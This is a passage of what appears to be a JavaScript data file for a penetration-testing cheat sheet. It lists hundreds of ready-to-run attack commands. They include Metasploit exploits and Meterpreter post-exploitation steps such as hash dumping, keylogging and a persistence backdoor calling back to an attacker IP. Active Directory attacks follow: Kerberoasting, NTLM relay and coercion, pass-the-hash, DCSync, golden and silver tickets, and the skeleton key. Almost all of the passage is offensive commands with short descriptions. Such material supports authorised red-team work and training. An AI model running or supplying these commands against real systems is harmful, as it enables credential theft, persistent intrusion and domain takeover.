          { title: "PHP CGI Argument Injection", cmds: ["use exploit/multi/http/php_cgi_arg_injection", "set RHOSTS <TARGET_IP>", "set LHOST <ATTACKER_IP>", "exploit"], tags: ["tool"], desc: "Exploit PHP-CGI argument injection (CVE-2012-1823)" },
          { title: "Rejetto HFS RCE", cmds: ["use exploit/windows/http/rejetto_hfs_exec", "set RHOSTS <TARGET_IP>", "set LHOST <ATTACKER_IP>", "exploit"], tags: ["tool"], desc: "Exploit Rejetto HTTP File Server for remote code execution" }
        ]
      },
      {
        name: "Meterpreter Post-Exploitation",
        commands: [
          { title: "System Information", cmd: "sysinfo", tags: ["essential"], desc: "Display target system information from meterpreter" },
          { title: "Current User ID", cmd: "getuid", tags: ["essential"], desc: "Show the user the meterpreter process is running as" },
          { title: "Elevate to SYSTEM", cmd: "getsystem", tags: ["essential"], desc: "Attempt to escalate privileges to NT AUTHORITY\\SYSTEM" },
          { title: "Dump Password Hashes", cmd: "hashdump", tags: ["essential"], desc: "Dump SAM database password hashes (requires SYSTEM)" },
          { title: "Load Kiwi (Mimikatz)", cmd: "load kiwi", tags: ["essential"], desc: "Load the Kiwi extension for credential extraction" },
          { title: "Dump All Credentials", cmd: "creds_all", tags: ["essential"], desc: "Dump all credentials including Kerberos tickets via Kiwi" },
          { title: "Dump Kerberos Credentials", cmd: "kerberos", tags: ["advanced"], desc: "Dump Kerberos tickets from memory via Kiwi" },
          { title: "Dump WiFi Passwords", cmd: "wifi_list", tags: ["advanced"], desc: "List and dump saved WiFi credentials via Kiwi" },
          { title: "Upload File to Target", cmd: "upload /path/to/local/file C:\\\\Windows\\\\Temp\\\\file", tags: ["essential"], desc: "Upload a file from attacker to target machine" },
          { title: "Download File from Target", cmd: "download C:\\\\Users\\\\<USER>\\\\Desktop\\\\secrets.txt /tmp/loot/", tags: ["essential"], desc: "Download a file from target to attacker machine" },
          { title: "Search for Files", cmd: "search -f *.txt -d C:\\\\Users\\\\", tags: ["essential"], desc: "Search for files matching a pattern on the target" },
          { title: "Search for Password Files", cmd: "search -f *pass* -d C:\\\\", tags: ["tool"], desc: "Search for files containing password in the name" },
          { title: "List Running Processes", cmd: "ps", tags: ["essential"], desc: "List all running processes on the target" },
          { title: "Migrate to Another Process", cmd: "migrate <PID>", tags: ["essential"], desc: "Migrate meterpreter to a different process for stability or privilege" },
          { title: "Drop to System Shell", cmd: "shell", tags: ["essential"], desc: "Open an interactive system command shell" },
          { title: "Background Current Session", cmd: "background", tags: ["essential"], desc: "Background the current meterpreter session" },
          { title: "Screenshot", cmd: "screenshot", tags: ["tool"], desc: "Capture a screenshot of the target's desktop" },
          { title: "Keylog Start", cmd: "keyscan_start", tags: ["advanced"], desc: "Start capturing keystrokes on the target" },
          { title: "Keylog Dump", cmd: "keyscan_dump", tags: ["advanced"], desc: "Dump captured keystrokes" },
          { title: "Enable RDP", cmd: "run post/windows/manage/enable_rdp", tags: ["advanced"], desc: "Enable Remote Desktop on the target" },
          { title: "Persistence via Registry", cmd: "run persistence -U -i 10 -p <PORT> -r <ATTACKER_IP>", tags: ["advanced"], desc: "Install a persistent reverse connection backdoor" },
          { title: "Local Exploit Suggester", cmd: "run post/multi/recon/local_exploit_suggester", tags: ["essential"], desc: "Suggest local privilege escalation exploits for the target" },
          { title: "Enum Logged On Users", cmd: "run post/windows/gather/enum_logged_on_users", tags: ["tool"], desc: "Enumerate currently and recently logged on users" },
          { title: "Enum Shares", cmd: "run post/windows/gather/enum_shares", tags: ["tool"], desc: "Enumerate network shares on the target" },
          { title: "Enum Linux System", cmd: "run post/linux/gather/enum_system", tags: ["tool"], desc: "Enumerate system information on a Linux target" }
        ]
      },
      {
        name: "Session Pivoting & Routing",
        commands: [
          { title: "List Active Sessions", cmd: "sessions -l", tags: ["essential"], desc: "List all active meterpreter/shell sessions" },
          { title: "Interact with Session", cmd: "sessions -i <SESSION_ID>", tags: ["essential"], desc: "Interact with a specific session by ID" },
          { title: "Kill All Sessions", cmd: "sessions -K", tags: ["tool"], desc: "Terminate all active sessions" },
          { title: "Auto-Route via Session", cmds: ["use post/multi/manage/autoroute", "set SESSION <SESSION_ID>", "set SUBNET <INTERNAL_SUBNET>", "set NETMASK 255.255.255.0", "run"], tags: ["essential"], desc: "Add a route to an internal network through a meterpreter session" },
          { title: "Auto-Route (Meterpreter)", cmd: "run autoroute -s <INTERNAL_SUBNET>/24", tags: ["essential"], desc: "Add route from within a meterpreter session" },
          { title: "Print Routes", cmd: "run autoroute -p", tags: ["tool"], desc: "Display all routes added through meterpreter sessions" },
          { title: "SOCKS Proxy for Pivoting", cmds: ["use auxiliary/server/socks_proxy", "set SRVHOST 127.0.0.1", "set SRVPORT 1080", "set VERSION 5", "run -j"], tags: ["essential"], desc: "Start a SOCKS5 proxy to route tools through the pivot" },
          { title: "Port Forward (Local)", cmd: "portfwd add -l <LOCAL_PORT> -p <REMOTE_PORT> -r <TARGET_IP>", tags: ["essential"], desc: "Forward a local port to a remote service through meterpreter" },
          { title: "Port Forward (List)", cmd: "portfwd list", tags: ["tool"], desc: "List all active port forwards" },
          { title: "Port Forward (Flush)", cmd: "portfwd flush", tags: ["tool"], desc: "Remove all active port forwards" },
          { title: "Upgrade Shell to Meterpreter", cmds: ["use post/multi/manage/shell_to_meterpreter", "set SESSION <SESSION_ID>", "set LHOST <ATTACKER_IP>", "run"], tags: ["essential"], desc: "Upgrade a basic shell session to a meterpreter session" }
        ]
      },
      {
        name: "Auxiliary Modules",
        commands: [
          { title: "SMB Version Scanner", cmds: ["use auxiliary/scanner/smb/smb_version", "set RHOSTS <TARGET_RANGE>", "set THREADS 10", "run"], tags: ["essential"], desc: "Scan for SMB versions across a range of hosts" },
          { title: "TCP Port Scanner", cmds: ["use auxiliary/scanner/portscan/tcp", "set RHOSTS <TARGET_RANGE>", "set PORTS 1-1024", "set THREADS 20", "run"], tags: ["essential"], desc: "Perform a TCP port scan through a pivot" },
          { title: "SMB Login Brute Force", cmds: ["use auxiliary/scanner/smb/smb_login", "set RHOSTS <TARGET_IP>", "set SMBUser <USER>", "set PASS_FILE /usr/share/wordlists/rockyou.txt", "run"], tags: ["tool"], desc: "Brute force SMB authentication credentials" },
          { title: "SSH Login Brute Force", cmds: ["use auxiliary/scanner/ssh/ssh_login", "set RHOSTS <TARGET_IP>", "set USERNAME <USER>", "set PASS_FILE /usr/share/wordlists/rockyou.txt", "set THREADS 5", "run"], tags: ["tool"], desc: "Brute force SSH credentials" },
          { title: "FTP Anonymous Check", cmds: ["use auxiliary/scanner/ftp/anonymous", "set RHOSTS <TARGET_RANGE>", "run"], tags: ["essential"], desc: "Check for anonymous FTP access on targets" },
          { title: "HTTP Directory Scanner", cmds: ["use auxiliary/scanner/http/dir_scanner", "set RHOSTS <TARGET_IP>", "set THREADS 10", "run"], tags: ["tool"], desc: "Scan for common directories on web servers" },
          { title: "SNMP Community Scanner", cmds: ["use auxiliary/scanner/snmp/snmp_enum", "set RHOSTS <TARGET_RANGE>", "run"], tags: ["tool"], desc: "Enumerate SNMP community strings and information" },
          { title: "VNC None Auth Scanner", cmds: ["use auxiliary/scanner/vnc/vnc_none_auth", "set RHOSTS <TARGET_RANGE>", "run"], tags: ["tool"], desc: "Scan for VNC servers with no authentication" },
          { title: "MSSQL Login Scanner", cmds: ["use auxiliary/scanner/mssql/mssql_login", "set RHOSTS <TARGET_IP>", "set USERNAME sa", "set PASS_FILE /usr/share/wordlists/rockyou.txt", "run"], tags: ["tool"], desc: "Brute force Microsoft SQL Server credentials" }
        ]
      }
    ]
  },

  // ─── 14. Active Directory Reconnaissance ───
  {
    id: "ad-recon",
    name: "Active Directory Reconnaissance",
    icon: "🏢",
    description: "Enumerate Active Directory domains, users, groups, trusts, and attack paths",
    subcategories: [
      {
        name: "Domain Discovery",
        commands: [
          { title: "SharpHound Collection (All)", cmd: "SharpHound.exe -c All --outputdirectory C:\\Temp\\", tags: ["essential"], desc: "Collect all BloodHound data from the domain" },
          { title: "SharpHound (Stealth)", cmd: "SharpHound.exe -c DCOnly --stealth", tags: ["advanced"], desc: "Collect BloodHound data using only DC queries for stealth" },
          { title: "BloodHound-Python (Remote)", cmd: "bloodhound-python -d <DOMAIN> -u <USER> -p <PASS> -ns <DC_IP> -c all", tags: ["essential"], desc: "Collect BloodHound data remotely from Linux" },
          { title: "Start Neo4j for BloodHound", cmd: "sudo neo4j console", tags: ["essential"], desc: "Start the Neo4j database backend for BloodHound" },
          { title: "PowerView Get-Domain", cmd: "Get-Domain", tags: ["essential"], desc: "Get information about the current domain" },
          { title: "PowerView Get-DomainController", cmd: "Get-DomainController", tags: ["essential"], desc: "Enumerate domain controllers in the current domain" },
          { title: "AD Module Get-ADDomain", cmd: "Get-ADDomain", tags: ["essential"], desc: "Get detailed domain information via AD PowerShell module" },
          { title: "Enum4linux-ng Full Scan", cmd: "enum4linux-ng -A <TARGET_IP>", tags: ["essential"], desc: "Comprehensive SMB/LDAP/RPC enumeration" },
          { title: "LDAP Domain Dump", cmd: "ldapdomaindump <DC_IP> -u '<DOMAIN>\\<USER>' -p '<PASS>' --no-json --no-grep", tags: ["essential"], desc: "Dump all domain objects via LDAP into HTML reports" },
          { title: "Windapsearch Users", cmd: "windapsearch -d <DOMAIN> -u <USER>@<DOMAIN> -p <PASS> --dc <DC_IP> -U", tags: ["tool"], desc: "Enumerate domain users via LDAP" },
          { title: "Windapsearch Computers", cmd: "windapsearch -d <DOMAIN> -u <USER>@<DOMAIN> -p <PASS> --dc <DC_IP> -C", tags: ["tool"], desc: "Enumerate domain computers via LDAP" },
          { title: "Kerbrute User Enumeration", cmd: "kerbrute userenum --dc <DC_IP> -d <DOMAIN> /path/to/userlist.txt", tags: ["essential"], desc: "Enumerate valid domain usernames via Kerberos without authentication" },
          { title: "Impacket GetADUsers", cmd: "impacket-GetADUsers -all -dc-ip <DC_IP> '<DOMAIN>/<USER>:<PASS>'", tags: ["essential"], desc: "Enumerate all domain users via LDAP with impacket" },
          { title: "Impacket Lookupsid", cmd: "impacket-lookupsid '<DOMAIN>/<USER>:<PASS>'@<DC_IP>", tags: ["tool"], desc: "Enumerate domain SIDs and associated accounts via RPC" },
          { title: "DNS Zone Transfer Attempt", cmd: "dig axfr <DOMAIN> @<DC_IP>", tags: ["tool"], desc: "Attempt a DNS zone transfer from a domain controller" }
        ]
      },
      {
        name: "User & Group Enumeration",
        commands: [
          { title: "PowerView Get All Users", cmd: "Get-DomainUser | Select-Object samaccountname, description, memberof", tags: ["essential"], desc: "Enumerate all domain users with key attributes" },
          { title: "PowerView Get Specific User", cmd: "Get-DomainUser -Identity <USER> -Properties *", tags: ["essential"], desc: "Get all properties for a specific domain user" },
          { title: "PowerView Get Domain Groups", cmd: "Get-DomainGroup | Select-Object samaccountname", tags: ["essential"], desc: "List all domain groups" },
          { title: "PowerView Get Group Members", cmd: "Get-DomainGroupMember -Identity 'Domain Admins' -Recurse", tags: ["essential"], desc: "Recursively enumerate members of Domain Admins" },
          { title: "PowerView Get Domain Computers", cmd: "Get-DomainComputer | Select-Object dnshostname, operatingsystem", tags: ["essential"], desc: "List all domain computers with OS info" },
          { title: "PowerView Get Domain OUs", cmd: "Get-DomainOU | Select-Object name, distinguishedname", tags: ["tool"], desc: "Enumerate all Organizational Units in the domain" },
          { title: "PowerView Get Domain GPOs", cmd: "Get-DomainGPO | Select-Object displayname, gpcfilesyspath", tags: ["tool"], desc: "List all Group Policy Objects in the domain" },
          { title: "AD Module Get-ADUser (All)", cmd: "Get-ADUser -Filter * -Properties * | Select-Object samaccountname, description, lastlogondate", tags: ["essential"], desc: "Enumerate all AD users with properties" },
          { title: "AD Module Get-ADGroup", cmd: "Get-ADGroup -Filter * | Select-Object name, groupscope", tags: ["tool"], desc: "List all AD groups with their scope" },
          { title: "AD Module Get-ADComputer", cmd: "Get-ADComputer -Filter * -Properties * | Select-Object name, operatingsystem, lastlogondate", tags: ["tool"], desc: "Enumerate all AD computers with OS and last logon" },
          { title: "Net User Domain Query", cmd: "net user /domain", tags: ["essential"], desc: "List all domain users via built-in Windows command" },
          { title: "Net Group Domain Admins", cmd: "net group \"Domain Admins\" /domain", tags: ["essential"], desc: "List members of Domain Admins via built-in command" },
          { title: "Find Users with Descriptions", cmd: "Get-DomainUser -LDAPFilter '(description=*)' | Select-Object samaccountname, description", tags: ["tool"], desc: "Find users with descriptions that may contain passwords", note: "Descriptions often contain password hints or temporary passwords" },
          { title: "PowerView Find Local Admin Access", cmd: "Find-LocalAdminAccess", tags: ["essential"], desc: "Find machines where the current user has local admin access" },
          { title: "PowerView Get-NetSession", cmd: "Get-NetSession -ComputerName <DC_HOSTNAME>", tags: ["tool"], desc: "Enumerate active sessions on a target computer" },
          { title: "PowerView Get-NetLoggedon", cmd: "Get-NetLoggedon -ComputerName <TARGET_HOSTNAME>", tags: ["tool"], desc: "Enumerate users logged onto a target computer" }
        ]
      },
      {
        name: "ACL Analysis",
        commands: [
          { title: "Find Interesting Domain ACLs", cmd: "Find-InterestingDomainAcl -ResolveGUIDs", tags: ["essential"], desc: "Find ACLs with interesting permissions across the domain" },
          { title: "Get ACL for Specific User", cmd: "Get-DomainObjectAcl -Identity <USER> -ResolveGUIDs | ? {$_.ActiveDirectoryRights -match 'WriteProperty|GenericAll|GenericWrite|WriteDacl|WriteOwner'}", tags: ["essential"], desc: "Check what permissions exist on a specific user object" },
          { title: "Find ACLs for Current User", cmd: "Find-InterestingDomainAcl -ResolveGUIDs | ? {$_.IdentityReferenceName -match '<USER>'}", tags: ["essential"], desc: "Find all ACL entries that grant permissions to a specific user" },
          { title: "Get ACL on Domain Object", cmd: "Get-DomainObjectAcl -SearchBase 'DC=<DOMAIN_PART1>,DC=<DOMAIN_PART2>' -ResolveGUIDs | ? {$_.ActiveDirectoryRights -eq 'GenericAll'}", tags: ["advanced"], desc: "Search for GenericAll permissions at the domain level" },
          { title: "Check WriteDACL on Group", cmd: "Get-DomainObjectAcl -Identity 'Domain Admins' -ResolveGUIDs | ? {$_.ActiveDirectoryRights -match 'WriteDacl'}", tags: ["advanced"], desc: "Check who has WriteDACL permission on Domain Admins" },
          { title: "Enumerate GPO Permissions", cmd: "Get-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs | ? {$_.ActiveDirectoryRights -match 'WriteProperty|WriteDacl'}", tags: ["advanced"], desc: "Find writable Group Policy Objects for potential abuse" }
        ]
      },
      {
        name: "Trust Mapping",
        commands: [
          { title: "PowerView Get Domain Trusts", cmd: "Get-DomainTrust", tags: ["essential"], desc: "Enumerate all domain trust relationships" },
          { title: "PowerView Get Forest Trusts", cmd: "Get-ForestTrust", tags: ["essential"], desc: "Enumerate forest-level trust relationships" },
          { title: "AD Module Get-ADTrust", cmd: "Get-ADTrust -Filter *", tags: ["essential"], desc: "List all AD trust relationships via AD module" },
          { title: "Map All Domain Trusts", cmd: "Get-DomainTrust -Domain <DOMAIN> | Select-Object SourceName, TargetName, TrustDirection, TrustType", tags: ["tool"], desc: "Map trust direction and type for all trusts" },
          { title: "Enumerate Foreign Group Members", cmd: "Get-DomainForeignGroupMember -Domain <DOMAIN>", tags: ["advanced"], desc: "Find users from foreign domains in local groups" },
          { title: "Find Domain Shares", cmd: "Find-DomainShare -CheckShareAccess", tags: ["essential"], desc: "Find accessible domain shares across the network" },
          { title: "Invoke-ShareFinder", cmd: "Invoke-ShareFinder -Verbose", tags: ["essential"], desc: "Discover and enumerate network shares across the domain" }
        ]
      },
      {
        name: "SPN & Delegation Discovery",
        commands: [
          { title: "Find Kerberoastable Users", cmd: "Get-DomainUser -SPN | Select-Object samaccountname, serviceprincipalname", tags: ["essential"], desc: "Find users with SPNs set (Kerberoastable)" },
          { title: "Find AS-REP Roastable Users", cmd: "Get-DomainUser -PreauthNotRequired | Select-Object samaccountname", tags: ["essential"], desc: "Find users with Kerberos pre-auth disabled" },
          { title: "Setspn Query All SPNs", cmd: "setspn -T <DOMAIN> -Q */*", tags: ["essential"], desc: "Query all registered SPNs in the domain" },
          { title: "Find Unconstrained Delegation", cmd: "Get-DomainComputer -Unconstrained | Select-Object dnshostname", tags: ["essential"], desc: "Find computers with unconstrained delegation enabled" },
          { title: "Find Constrained Delegation", cmd: "Get-DomainComputer -TrustedToAuth | Select-Object dnshostname, msds-allowedtodelegateto", tags: ["essential"], desc: "Find computers with constrained delegation configured" },
          { title: "Find User Constrained Delegation", cmd: "Get-DomainUser -TrustedToAuth | Select-Object samaccountname, msds-allowedtodelegateto", tags: ["tool"], desc: "Find users with constrained delegation configured" },
          { title: "Find RBCD Targets", cmd: "Get-DomainComputer | Get-DomainObjectAcl -ResolveGUIDs | ? {$_.ActiveDirectoryRights -match 'GenericWrite|GenericAll|WriteDacl'}", tags: ["advanced"], desc: "Find computers where RBCD can be configured" },
          { title: "LAPS Password Discovery", cmd: "Get-DomainComputer | ? {'ms-Mcs-AdmPwd' -in $_.Properties.PropertyNames} | Select-Object dnshostname, ms-mcs-admpwd", tags: ["essential"], desc: "Read LAPS passwords if the current user has access", note: "Requires read permission on ms-Mcs-AdmPwd attribute" },
          { title: "Check LAPS Deployment", cmd: "Get-DomainComputer -LDAPFilter '(ms-Mcs-AdmPwdExpirationTime=*)' | Select-Object dnshostname", tags: ["tool"], desc: "Identify computers where LAPS is deployed" },
          { title: "Impacket FindDelegation", cmd: "impacket-findDelegation '<DOMAIN>/<USER>:<PASS>' -dc-ip <DC_IP>", tags: ["essential"], desc: "Find all delegation configurations using impacket" }
        ]
      }
    ]
  },

  // ─── 15. Active Directory Exploitation ───
  {
    id: "ad-attacks",
    name: "Active Directory Exploitation",
    icon: "🎯",
    description: "Attack Active Directory with Kerberos, NTLM relay, delegation, and persistence techniques",
    subcategories: [
      {
        name: "Kerberos Attacks",
        commands: [
          { title: "Kerberoasting (Impacket)", cmd: "impacket-GetUserSPNs '<DOMAIN>/<USER>:<PASS>' -dc-ip <DC_IP> -request -outputfile kerberoast_hashes.txt", tags: ["essential"], desc: "Request TGS tickets for all SPNs and save hashes for cracking" },
          { title: "Kerberoasting (Rubeus)", cmd: "Rubeus.exe kerberoast /outfile:kerberoast_hashes.txt", tags: ["essential"], desc: "Request and dump TGS tickets for all Kerberoastable users" },
          { title: "Kerberoast Specific User", cmd: "Rubeus.exe kerberoast /user:<USER> /nowrap", tags: ["tool"], desc: "Target a specific user for Kerberoasting" },
          { title: "Crack Kerberoast Hashes", cmd: "hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt", tags: ["essential"], desc: "Crack TGS-REP hashes (Kerberoast) with hashcat" },
          { title: "AS-REP Roasting (Impacket)", cmd: "impacket-GetNPUsers '<DOMAIN>/' -usersfile users.txt -dc-ip <DC_IP> -no-pass -outputfile asrep_hashes.txt", tags: ["essential"], desc: "Extract AS-REP hashes for users without pre-auth" },
          { title: "AS-REP Roasting (Rubeus)", cmd: "Rubeus.exe asreproast /format:hashcat /outfile:asrep_hashes.txt", tags: ["essential"], desc: "Extract AS-REP hashes using Rubeus on Windows" },
          { title: "Crack AS-REP Hashes", cmd: "hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt", tags: ["essential"], desc: "Crack AS-REP hashes with hashcat" },
          { title: "Overpass the Hash (Rubeus)", cmd: "Rubeus.exe asktgt /user:<USER> /rc4:<NTLM_HASH> /ptt", tags: ["essential"], desc: "Request TGT using NTLM hash and inject into current session" },
          { title: "Overpass the Hash (Impacket)", cmd: "impacket-getTGT '<DOMAIN>/<USER>' -hashes :<NTLM_HASH> -dc-ip <DC_IP>", tags: ["essential"], desc: "Request TGT using NTLM hash and save to ccache file" },
          { title: "Pass the Ticket (.kirbi)", cmd: "Rubeus.exe ptt /ticket:<BASE64_TICKET>", tags: ["essential"], desc: "Inject a Kerberos ticket into the current session" },
          { title: "Pass the Ticket (.ccache)", cmd: "export KRB5CCNAME=/path/to/ticket.ccache", tags: ["essential"], desc: "Set ccache file for Linux Kerberos authentication" }
        ]
      },
      {
        name: "NTLM Relay & Coercion",
        commands: [
          { title: "Responder LLMNR/NBT-NS Poisoning", cmd: "sudo responder -I <INTERFACE> -dwPv", tags: ["essential"], desc: "Poison LLMNR, NBT-NS, and MDNS to capture Net-NTLMv2 hashes" },
          { title: "Responder (Analyze Mode)", cmd: "sudo responder -I <INTERFACE> -A", tags: ["tool"], desc: "Run Responder in analyze mode to see traffic without poisoning" },
          { title: "NTLM Relay to SMB", cmd: "impacket-ntlmrelayx -tf targets.txt -smb2support", tags: ["essential"], desc: "Relay captured NTLM authentication to SMB targets for SAM dump" },
          { title: "NTLM Relay to LDAP", cmd: "impacket-ntlmrelayx -t ldap://<DC_IP> --delegate-access", tags: ["essential"], desc: "Relay NTLM auth to LDAP and configure RBCD" },
          { title: "NTLM Relay to LDAP (Shadow Creds)", cmd: "impacket-ntlmrelayx -t ldap://<DC_IP> --shadow-credentials --shadow-target <TARGET_COMPUTER>$", tags: ["advanced"], desc: "Relay to LDAP and add shadow credentials for PKINIT auth" },
          { title: "NTLM Relay Execute Command", cmd: "impacket-ntlmrelayx -tf targets.txt -smb2support -c 'whoami'", tags: ["tool"], desc: "Relay NTLM auth and execute a command on the target" },
          { title: "PetitPotam Coercion", cmd: "python3 PetitPotam.py <ATTACKER_IP> <DC_IP>", tags: ["essential"], desc: "Coerce DC authentication via MS-EFSRPC (EFS)" },
          { title: "PetitPotam (Authenticated)", cmd: "python3 PetitPotam.py -u <USER> -p <PASS> -d <DOMAIN> <ATTACKER_IP> <DC_IP>", tags: ["tool"], desc: "Coerce DC authentication with credentials" },
          { title: "PrinterBug / SpoolSample", cmd: "python3 printerbug.py '<DOMAIN>/<USER>:<PASS>'@<DC_IP> <ATTACKER_IP>", tags: ["essential"], desc: "Coerce authentication via MS-RPRN print spooler service" },
          { title: "Coercer (All Methods)", cmd: "python3 Coercer.py -u <USER> -p <PASS> -d <DOMAIN> -t <DC_IP> -l <ATTACKER_IP>", tags: ["tool"], desc: "Attempt all known coercion methods against a target" },
          { title: "mitm6 IPv6 DNS Takeover", cmd: "sudo mitm6 -d <DOMAIN>", tags: ["essential"], desc: "Perform IPv6 DNS takeover for NTLM relay via WPAD" },
          { title: "mitm6 + ntlmrelayx Combo", cmds: ["sudo mitm6 -d <DOMAIN>", "# In another terminal:", "impacket-ntlmrelayx -6 -t ldaps://<DC_IP> --delegate-access"], tags: ["advanced"], desc: "Combine mitm6 with ntlmrelayx for LDAP relay attack", note: "Run mitm6 and ntlmrelayx in separate terminals" }
        ]
      },
      {
        name: "Credential Relay",
        commands: [
          { title: "Crack Net-NTLMv2 Hash", cmd: "hashcat -m 5600 captured_hash.txt /usr/share/wordlists/rockyou.txt", tags: ["essential"], desc: "Crack captured Net-NTLMv2 hashes with hashcat" },
          { title: "Crack NTLMv1 Hash", cmd: "hashcat -m 5500 captured_hash.txt /usr/share/wordlists/rockyou.txt", tags: ["tool"], desc: "Crack captured NTLMv1 hashes with hashcat" },
          { title: "NTLM Relay Interactive Shell", cmd: "impacket-ntlmrelayx -tf targets.txt -smb2support -i", tags: ["advanced"], desc: "Get an interactive SMB shell through NTLM relay" },
          { title: "NTLM Relay Dump Secrets", cmd: "impacket-ntlmrelayx -tf targets.txt -smb2support --dump-laps --dump-adcs --dump-gmsa", tags: ["advanced"], desc: "Relay and dump LAPS, ADCS, and gMSA data" },
          { title: "Generate Targets List (No SMB Signing)", cmd: "crackmapexec smb <TARGET_RANGE> --gen-relay-list relay_targets.txt", tags: ["essential"], desc: "Generate list of hosts without SMB signing for relay attacks" }
        ]
      },
      {
        name: "Pass the Hash / Ticket",
        commands: [
          { title: "PtH with Impacket PsExec", cmd: "impacket-psexec -hashes :<NTLM_HASH> '<DOMAIN>/<USER>'@<TARGET_IP>", tags: ["essential"], desc: "Pass the Hash via PsExec for SYSTEM shell" },
          { title: "PtH with Impacket WMIExec", cmd: "impacket-wmiexec -hashes :<NTLM_HASH> '<DOMAIN>/<USER>'@<TARGET_IP>", tags: ["essential"], desc: "Pass the Hash via WMI for semi-interactive shell" },
          { title: "PtH with Impacket SMBExec", cmd: "impacket-smbexec -hashes :<NTLM_HASH> '<DOMAIN>/<USER>'@<TARGET_IP>", tags: ["essential"], desc: "Pass the Hash via SMB service for SYSTEM shell" },
          { title: "PtH with Impacket AtExec", cmd: "impacket-atexec -hashes :<NTLM_HASH> '<DOMAIN>/<USER>'@<TARGET_IP> 'whoami'", tags: ["tool"], desc: "Pass the Hash via scheduled task execution" },
          { title: "PtH with CrackMapExec", cmd: "crackmapexec smb <TARGET_IP> -u <USER> -H <NTLM_HASH> -d <DOMAIN> -x 'whoami'", tags: ["essential"], desc: "Pass the Hash and execute commands with CME" },
          { title: "PtH with Evil-WinRM", cmd: "evil-winrm -i <TARGET_IP> -u <USER> -H <NTLM_HASH>", tags: ["essential"], desc: "Pass the Hash via WinRM for PowerShell access" },
          { title: "Mimikatz Pass the Hash", cmd: "sekurlsa::pth /user:<USER> /domain:<DOMAIN> /ntlm:<NTLM_HASH> /run:cmd.exe", tags: ["essential"], desc: "Inject NTLM hash into a new process with mimikatz" },
          { title: "Import ccache Ticket", cmd: "export KRB5CCNAME=/path/to/ticket.ccache && impacket-psexec -k -no-pass <DOMAIN>/<USER>@<TARGET_HOSTNAME>", tags: ["advanced"], desc: "Use a cached Kerberos ticket for authentication" }
        ]
      },
      {
        name: "Delegation Exploitation",
        commands: [
          { title: "Unconstrained Delegation — Extract TGT", cmd: "Rubeus.exe monitor /interval:5 /filteruser:<DC_HOSTNAME>$", tags: ["essential"], desc: "Monitor for incoming TGTs on an unconstrained delegation host" },
          { title: "Constrained Delegation — S4U (Rubeus)", cmd: "Rubeus.exe s4u /user:<SERVICE_ACCT> /rc4:<NTLM_HASH> /impersonateuser:Administrator /msdsspn:cifs/<TARGET_HOSTNAME> /ptt", tags: ["essential"], desc: "Abuse constrained delegation via S4U2Self and S4U2Proxy" },
          { title: "Constrained Delegation — S4U (Impacket)", cmd: "impacket-getST -spn cifs/<TARGET_HOSTNAME> -impersonate Administrator '<DOMAIN>/<SERVICE_ACCT>' -hashes :<NTLM_HASH> -dc-ip <DC_IP>", tags: ["essential"], desc: "Perform S4U attack with impacket for service ticket" },
          { title: "RBCD Attack — Set msDS-AllowedToActOnBehalfOfOtherIdentity", cmds: ["impacket-addcomputer '<DOMAIN>/<USER>:<PASS>' -computer-name 'FAKE01$' -computer-pass 'FakePass123!'", "impacket-rbcd '<DOMAIN>/<USER>:<PASS>' -delegate-to '<TARGET_COMPUTER>$' -delegate-from 'FAKE01$' -dc-ip <DC_IP> -action write", "impacket-getST -spn cifs/<TARGET_HOSTNAME> -impersonate Administrator '<DOMAIN>/FAKE01$:FakePass123!' -dc-ip <DC_IP>"], tags: ["advanced"], desc: "Full RBCD attack: add computer, set delegation, get ticket" },
          { title: "RBCD via PowerShell", cmds: ["Set-ADComputer <TARGET_COMPUTER> -PrincipalsAllowedToDelegateToAccount (Get-ADComputer FAKE01)", "Rubeus.exe s4u /user:FAKE01$ /rc4:<NTLM_HASH> /impersonateuser:Administrator /msdsspn:cifs/<TARGET_HOSTNAME> /ptt"], tags: ["advanced"], desc: "Configure RBCD via AD module and abuse with Rubeus" }
        ]
      },
      {
        name: "Domain Persistence & Dominance",
        commands: [
          { title: "DCSync with Mimikatz", cmd: "lsadump::dcsync /user:<DOMAIN>\\krbtgt", tags: ["essential"], desc: "Replicate credentials from DC using directory replication rights" },
          { title: "DCSync with Impacket", cmd: "impacket-secretsdump '<DOMAIN>/<USER>:<PASS>'@<DC_IP> -just-dc", tags: ["essential"], desc: "Dump all domain hashes via DCSync with impacket" },
          { title: "DCSync Specific User", cmd: "impacket-secretsdump '<DOMAIN>/<USER>:<PASS>'@<DC_IP> -just-dc-user krbtgt", tags: ["essential"], desc: "DCSync only the krbtgt account hash" },
          { title: "DCSync with Hashes", cmd: "impacket-secretsdump -hashes :<NTLM_HASH> '<DOMAIN>/<USER>'@<DC_IP> -just-dc-ntlm", tags: ["tool"], desc: "DCSync using Pass the Hash for NTLM hashes only" },
          { title: "Golden Ticket (Mimikatz)", cmd: "kerberos::golden /user:Administrator /domain:<DOMAIN> /sid:<DOMAIN_SID> /krbtgt:<KRBTGT_HASH> /ptt", tags: ["essential"], desc: "Forge a Golden Ticket and inject into current session" },
          { title: "Golden Ticket (Impacket)", cmd: "impacket-ticketer -nthash <KRBTGT_HASH> -domain-sid <DOMAIN_SID> -domain <DOMAIN> Administrator", tags: ["essential"], desc: "Forge a Golden Ticket ccache file" },
          { title: "Silver Ticket (Mimikatz)", cmd: "kerberos::golden /user:Administrator /domain:<DOMAIN> /sid:<DOMAIN_SID> /target:<TARGET_HOSTNAME> /service:cifs /rc4:<SERVICE_NTLM_HASH> /ptt", tags: ["advanced"], desc: "Forge a Silver Ticket for a specific service" },
          { title: "Diamond Ticket (Rubeus)", cmd: "Rubeus.exe diamond /krbkey:<KRBTGT_AES256> /user:Administrator /domain:<DOMAIN> /dc:<DC_HOSTNAME> /enctype:aes256 /ptt", tags: ["advanced"], desc: "Forge a Diamond Ticket by modifying a legitimate TGT" },
          { title: "Skeleton Key", cmd: "misc::skeleton", tags: ["advanced"], desc: "Inject skeleton key into LSASS on DC — master password 'mimikatz'", note: "Allows login as any user with password 'mimikatz' - lost on reboot" },
          { title: "DCShadow Push Attribute", cmds: ["lsadump::dcshadow /object:<TARGET_USER> /attribute:description /value:\"Pwned\"", "# In another mimikatz session:", "lsadump::dcshadow /push"], tags: ["advanced"], desc: "Push arbitrary AD changes by impersonating a domain controller" },
